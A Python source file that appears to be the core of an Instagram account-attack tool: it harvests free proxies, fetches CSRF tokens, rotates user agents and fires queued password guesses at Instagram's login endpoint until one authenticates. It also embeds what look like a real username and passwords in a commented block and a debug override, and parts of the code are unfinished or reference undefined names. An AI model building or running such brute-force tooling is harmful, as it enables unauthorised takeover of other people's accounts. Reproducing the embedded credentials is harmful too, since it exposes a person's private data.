from __future__ import absolute_import

import logging
import logging.config

import aiohttp
import asyncio
import random
import signal
from proxybroker import Broker

from app import settings

from app.lib import exceptions
from app.lib.logging import AppLogger
from app.lib.models import InstagramResult
from app.lib.sessions import InstagramSession
from app.lib.users import User
from app.lib.utils import (auto_logger, get_token_from_cookies,
    get_token_from_response, get_cookies_from_response)


__all__ = ('EngineAsync', )


class Engine(object):

    __loggers__ = {
        '__base__': 'Instagram Engine',
        'attack': 'Attack',
        '_test_attack_async': 'Test Async Attack',
        '_test_attack_sync': 'Test Sync Attack',
        '_attack_sync': 'Synchronous Attack',
        '_attack_asnc': 'Asynchronous Attack',
        'consume_passwords': 'Logging In',
        'test_consume_passwords': 'Logging In',
        'populate_passwords': 'Populating Passwords',
        'get_proxy_tokens': 'Fetching Tokens',
        'consume_attempts': 'Storing Attempted Password',
    }

    def __init__(self, username):
        self.user = User(username)

        logging.setLoggerClass(AppLogger)
        self.log = logging.getLogger(self.__loggers__['__base__'])


class ExceptionHandler(object):

    async def exception_handler(self, coro, loop):
        try:
            await coro
        except Exception as e:
            self.log.info('from handler')
            self.log.error(str(e))
            loop.stop()

    async def shutdown(self, signal, loop):

        self.log.info(f'Received exit signal {signal.name}...')
        tasks = [t for t in asyncio.all_tasks() if t is not
            asyncio.current_task()]

        [task.cancel() for task in tasks]

        self.log.info('Canceling outstanding tasks...')
        await asyncio.gather(*tasks)

        loop.stop()
        self.log.success('Shutdown complete.')

    def _handle_api_exception(self, fut, exc, log):
        if isinstance(exc, exceptions.BadProxyException):
            log.info(exc.message, extra={
                'task': fut,
                'proxy': fut.proxy,
            })
        else:
            log.warning(exc.message, extra={
                'task': fut,
                'proxy': fut.proxy,
            })

    def _handle_app_exception(self, fut, exc, log):
        if isinstance(exc, exceptions.ApiException):
            self._handle_api_exception(fut, exc, log)
        else:
            raise exc

    def _handle_response_exception(self, fut, exc, log):
        if isinstance(exc, exceptions.InstagramAttackException):
            self._handle_app_exception(fut, exc, log)
        else:
            raise exc
            # log.error(exc.__class__.__name__, extra={
            #     'task': fut,
            #     'proxy': fut.proxy,
            # })


class EnginePasswordMixin(ExceptionHandler):

    @auto_logger(show_running=False)
    async def test_consume_passwords(self, loop, response, log):

        stop_event = asyncio.Event()

        def callback(fut):
            exc = fut.exception()
            if exc:
                raise exc
                # self._handle_response_exception(fut, exc, log)
                self.log.error(exc.__class__.__name__, extra={'proxy': fut.proxy})
            elif not fut.result():
                # Right now, logging is done in sessions and we are returning None
                # if server error found.
                # If we stop the logging in sessions and raise the exceptions
                # direction in the session, we should raise a RuntimeError here.
                log.warning("The coroutine did not contain a result.")
            else:
                response = fut.result()
                log.success('got result')
                log.success(response)

                result = InstagramResult.from_dict(response)
                if result.accessed:
                    log.success("Authenticated", extra={'proxy': fut.proxy})
                else:
                    log.error('Not Authenticated', extra={'proxy': fut.proxy})

        async def bound_login(sem, session, username, password, token, proxy):
            # async with sem:
            log.info('Attempting Login', extra={
                'proxy': proxy,
            })
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                proxy=f"http://{proxy.host}:{proxy.port}/",
                timeout=settings.DEFAULT_LOGIN_FETCH_TIME,
                json={
                    'username': username,
                    'password': password
                },
            ) as response:
                # response = await self._handle_response(response)
                # import ipdb; ipdb.set_trace()
                return await response.json()
                # return await session.login(username, password, token, proxy)

        tasks = []
        sem = asyncio.Semaphore(5)

        connector = aiohttp.TCPConnector(ssl=False)
        headers = settings.HEADER.copy()
        headers['user-agent'] = random.choice(settings.USER_AGENTS)
        headers['x-csrftoken'] = token
        cookies = {'x-csrftoken': token}
        async with aiohttp.ClientSession(headers=headers, connector=connector, cookies=cookies) as session:
            # For the test, we already have a password.  We just have to try
            # until we get valid results.
            # while not stop_event.is_set():
            for i in range(5):
                proxy = await self.proxies.get()
                if not proxy:
                    continue

                task = asyncio.create_task(bound_login(
                    sem,
                    session,
                    self.user.username,
                    self.password,
                    token,
                    proxy
                ))

                task.name = f"Login Task {len(tasks) - 1}"
                task.proxy = proxy
                task.token = token

                task.add_done_callback(callback)
                tasks.append(task)

            responses = await asyncio.gather(*tasks, return_exceptions=True)

        results = []
        for resp in responses:
            if not isinstance(resp, Exception):
                result = InstagramResult.from_dict(resp)
                results.append(result)
        return results


class EngineProxyMixin(ExceptionHandler):

    @auto_logger(show_running=False)
    async def get_proxy_tokens(self, loop, log):

        stop_event = asyncio.Event()

        def callback(fut):
            exc = fut.exception()
            if exc:
                self._handle_response_exception(fut, exc, log)
            elif not fut.result():
                # Right now, logging is done in sessions and we are returning None
                # if server error found.
                # If we stop the logging in sessions and raise the exceptions
                # direction in the session, we should raise a RuntimeError here.
                log.warning("The coroutine did not contain a result.")
                pass
            else:
                response = fut.result()
                token = get_token_from_response(response)
                if token:
                    log.warning("Got token, setting stop event.", extra={
                        'proxy': fut.proxy,
                        'status_code': response.status,
                        'task': fut,
                    })
                    stop_event.set()
                else:
                    log.warning("Token was not in response.", extra={
                        'proxy': fut.proxy,
                        'status_code': response.status,
                        'task': fut,
                    })

        tasks = []
        async with InstagramSession() as session:
            while not stop_event.is_set():
                proxy = await self.proxies.get()
                if not proxy:
                    continue

                task = asyncio.ensure_future(session.fetch(proxy))

                task.name = f"Task {len(tasks) - 1}"
                task.proxy = proxy
                log.info("Got proxy", extra={
                    'proxy': proxy,
                    'task': task,
                })

                task.add_done_callback(callback)
                tasks.append(task)

            responses = await asyncio.gather(*tasks, return_exceptions=True)

        async def filter_out_tokens(responses):
            # Some responses may be None because we are logging instead of raising in Session.
            tokens = []
            for response in responses:
                # Because we are currently logging with exception catching in
                # the session, we can wind up with null responses.
                if not isinstance(response, Exception) and response is not None:
                    token = get_token_from_response(response)
                    if token:
                        result = self.test_consume_passwords(loop, response)
                        print(result)
                    tokens.append(response)
            return tokens

        # We do this 20 concurrent requests at a time, but there is a chance that
        # all of the proxies are bad, so we would have to keep going.
        # TODO: Use a semaphore.
        # responses = await get_responses()
        return await filter_out_tokens(responses)


class EngineAsync(Engine, EngineProxyMixin, EnginePasswordMixin):

    def __init__(self, username, mode='async', test=False, password=None):
        super(EngineAsync, self).__init__(username)
        self.lock = asyncio.Lock()

        self.mode = mode

        if test and not password:
            raise exceptions.EngineException("Must provide password to test async attack.")

        self.test = test
        self.password = password  # Used for Testing

        self.passwords = asyncio.Queue()
        self.attempts = asyncio.Queue()

        self.proxies = asyncio.Queue()

        self.broker = Broker(self.proxies, timeout=6, max_conn=200, max_tries=1)

        self.option_handler = {
            ('async', False): self._attack_async,
            ('sync', False): self._attack_sync,
            ('async', True): self._test_attack_async,
            ('sync', True): self._test_attack_sync,
        }

    @auto_logger
    async def populate_passwords(self, loop, log):
        """
        Retrieves passwords generated passwords that have not been attempted
        from the User object and populates the password queue.
        """
        for password in self.user.get_new_attempts():
            self.passwords.put_nowait(password)

        if self.passwords.empty():
            raise exceptions.EngineException("No new passwords to try.")

        log.info(f"Populated {self.passwords.qsize()} Passwords")

    @auto_logger
    async def _attack_async(self, loop, log):
        """
        Right now, we are not going to wrap this in handle_exceptions
        because we do not have the exception handling sealed off enough
        yet in order to allow the failed requests to not close the loop.

        This might have something to do with return_exceptions **kwarg in the
        asyncio.gather_tasks call.
        """
        tokens = await asyncio.ensure_future(self.get_tokens(loop))
        print(tokens)

    @auto_logger
    async def _test_attack_async(self, loop, log):
        # Find a way to make the consumption of passwords start immediately when
        # the first token is found, by setting self.token and having a hold
        # in the consume passwords task until self.token is set.
        tokens = await self.get_proxy_tokens(loop)
        if None in tokens:
            raise RuntimeError("Should not have None value for a token.")

        # await self.exception_handler(self.test_consume_passwords(loop, tokens[0]), loop)
        await self.test_consume_passwords(loop, tokens[0])

    @auto_logger
    async def _attack_sync(self, loop, log):
        pass

    @auto_logger
    async def _test_attack_sync(self, loop, log):
        pass
        # with requests.Session() as session:
        #     session.headers = settings.HEADER.copy()
        #     session.headers['x-csrftoken'] = token

        #     session.proxies.update({
        #         'http': f"http://{proxy.ip}:{proxy.port}",
        #         'https': f"http://{proxy.ip}:{proxy.port}",
        #     })
        #     response = session.post(
        #         settings.INSTAGRAM_LOGIN_URL,
        #         timeout=(6, 10),
        #         data={
        #             'username': 'nickmflorin',
        #             'password': 'Ca23tlin083801331',
        #         },
        #     )
        #     return response.json()

    @auto_logger
    async def attack(self, loop, log):
        # May want to catch other signals too - these are not currently being
        # used, but could probably be expanded upon.
        signals = (signal.SIGHUP, signal.SIGTERM, signal.SIGINT)
        for s in signals:
            loop.add_signal_handler(
                s, lambda s=s: asyncio.create_task(self.shutdown(s, loop)))

        try:
            await self.exception_handler(self.populate_passwords(loop), loop)

            types = ['HTTP']
            tasks = [
                self.broker.find(types=types),
                loop.create_task(
                    self.option_handler[(self.mode, self.test)](loop),
                )
            ]
            await asyncio.gather(*tasks)

        finally:
            self.log.info('Cleaning up')
            tasks = [t for t in asyncio.all_tasks() if t is not
            asyncio.current_task()]

            [task.cancel() for task in tasks]

            self.log.info('Canceling outstanding tasks...')
            await asyncio.gather(*tasks)

            loop.stop()
            self.log.success('Shutdown complete.')

            loop.stop()

    @auto_logger(show_running=False)
    async def consume_attempts(self, loop, log):
        while not self.stop_event.is_set():
            try:
                attempt = self.attempts.get_nowait()
            except asyncio.QueueEmpty:
                continue
            else:
                async with self.lock:
                    log.info(f"Storing User Attempt {attempt}")
                    self.user.add_password_attempt(attempt)

    @auto_logger(show_running=False)
    async def consume_passwords(self, loop, token, log):

        def callback(fut):
            log.success(fut.result())
            exc = fut.exception()
            if exc:
                if isinstance(exc, exceptions.BadProxyException):
                    log.warn(str(exc), extra={'proxy': getattr(exc, 'proxy', None)})
                    if not hasattr(exc, 'proxy'):
                        log.error(f"Exception {exc.__class__.__name__} does not "
                            "have proxy attribute.")
                    elif exc.proxy is None:
                        log.error(f"Exception {exc.__class__.__name__} was not "
                            "assigned a proxy.")
                    else:
                        try:
                            self.proxy_list.remove(exc.proxy)
                        except ValueError:
                            log.error(f"{exc.proxy} not in the list... cannot remove.")
                else:
                    log.error(str(exc), extra={'proxy': getattr(exc, 'proxy', None)})

            # Logic that checks for authentication is doen in InstagramSession,
            # there will only be a result if it is authenticated.
            elif fut.result():
                result, password, proxy = fut.result()
                log.success(f"Authenticated!")
                self.stop_event.set()

        # async def bound_login(sem, session, username, password, token, use_proxy):
        #     print("Waiting for sem")
        #     async with sem:
        #         print("FETCHING")
        #         await session.login(username, password, token, use_proxy)

        async def login_with_token(self, loop, token):
            tasks = []
            # sem = asyncio.Semaphore(5)

            async with InstagramSession() as session:
                # We might have to remove the queue.empty() check if we are going
                # to put passwords back in if there is a failure with the proxy.
                # while not self.stop_event.is_set() and not queue.empty():
                while not self.passwords.empty():
                    try:
                        password = await self.passwords.get()
                    except asyncio.QueueEmpty:
                        continue
                    else:
                        password = "Whispering3660664Blue!"
                        task = asyncio.create_task(bound_login(
                            sem,
                            session,
                            "nickmflorin",
                            password,
                            token,
                            use_proxy
                        ))
                        task.add_done_callback(callback)
                        tasks.append(task)

                print(f"TASKS : {len(tasks)}")
                return await asyncio.gather(*tasks)

        # Just try with first proxy and first token for now
        # proxy = self.proxy_list[0]
        # for i in range(10):
        #     token = tokens[i]
        #     results = await login_with_passwords(self.passwords, token)
        #     print(results)
        # # We might want to login in batches of passwords.
        # # We also have to make sure we do not run out of proxies!!
        # async def get_authentication_results():
        #     tasks = []
        #     async with self.lock:
        #         proxy = self.proxy_list[0]

        #     async with InstagramSession() as session:
        #         for i in range(25):

        #             proxy = self.proxy_list[i]
        #             task = asyncio.ensure_future(session.get_token(proxy))
        #             task.add_done_callback(callback)
        #             tasks.append(task)

        #         return await asyncio.gather(*tasks, return_exceptions=True)

        # async def filter_tokens(results):
        #     """
        #     For whatever reason, raising TokenNotInResponse in the session
        #     is causing a None value to be returned instead of the exception.
        #     For now, we will just filter out None as well.
        #     """
        #     tokens = []
        #     for result in results:
        #         if not isinstance(result, Exception) and result is not None:
        #             tokens.append(result)
        #     return tokens

        # tasks = []
        # sem = asyncio.Semaphore(1000)

        # async with InstagramSession() as session:
        #     for url in settings.PROXY_LINKS:
        #         log.info(f"Scraping Proxies at {url}")
        #         task = asyncio.ensure_future(session.get_proxies(
        #             url,
        #         ))
        #         tasks.append(task)
        #         task.add_done_callback(callback)

        #     log.info(f"Scraping Proxies at {settings.EXTRA_PROXY}")
        #     task = asyncio.ensure_future(session.get_extra_proxies())
        #     tasks.append(task)
        #     task.add_done_callback(callback)

        #     await asyncio.gather(*tasks, return_exceptions=True)

        # try:
        #     password = self.passwords.get_nowait()
        # except asyncio.QueueEmpty:
        #     continue
        # else:
        #     async with InstagramSession() as session:

        #         tasks = []
        #         while not self.stop_event.is_set() and len(self.proxy_list):
        #             async with self.lock:
        #                 proxy = self.proxy_list[0]

        #             task = asyncio.ensure_future(session.login(
        #                 self.user.username,
        #                 password,
        #                 token,
        #                 proxy,
        #             ))

        #             task.add_done_callback(callback)
        #             tasks.append(task)

        #         await asyncio.gather(*tasks, return_exceptions=True)
